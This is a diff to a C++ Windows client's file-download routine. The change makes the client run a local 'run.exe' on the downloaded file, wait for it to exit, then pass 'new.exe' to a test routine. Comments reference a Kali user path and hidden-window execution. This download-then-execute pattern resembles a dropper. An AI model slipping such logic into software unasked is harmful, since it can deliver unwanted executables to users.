@@ -118,10 +118,37 @@ void Client::GetFile()
 	} while (retval > 0);
 	CancelIo(fFile);
 	CloseHandle(fFile);
-	std::cout << "Complite!" << std::endl;
+	std::cout << "Complite download!" << std::endl;
 	//system("C:\\Users\\Kali\\Desktop\\test.exe");
 	//ShellExecute(NULL, NULL, fullpath.c_str(), NULL, NULL, SW_HIDE);
-	std::string str = ws2s(wfullpath);
+	std::wstring wstr = L"";
+	wstr.assign(path);
+	wstr += L"\\run.exe";
+	SHELLEXECUTEINFO ShExecInfo = { 0 };
+
+	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+	ShExecInfo.hwnd = NULL;
+	ShExecInfo.lpVerb = NULL;
+	ShExecInfo.lpFile = wstr.c_str();
+	ShExecInfo.lpParameters = wfullpath.c_str();
+	ShExecInfo.lpDirectory = NULL;
+	ShExecInfo.nShow = SW_SHOWNORMAL;
+	ShExecInfo.hInstApp = NULL;
+
+	BOOL result = ShellExecuteExW(&ShExecInfo);
+	HANDLE hRun = ShExecInfo.hProcess;
+	DWORD exitcode = 0;
+	GetExitCodeProcess(hRun, &exitcode);
+	while (exitcode == STILL_ACTIVE)
+	{
+		std::cout << "process active" << std::endl;
+		Sleep(500);
+		GetExitCodeProcess(hRun, &exitcode);
+	}
+	wstr.assign(path);
+	wstr += L"\\new.exe";
+	std::string str = ws2s(wstr);
 	HANDLE threadhandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)testFile, &str, NULL, NULL);
 	WaitForSingleObject(threadhandle, INFINITE);
 }
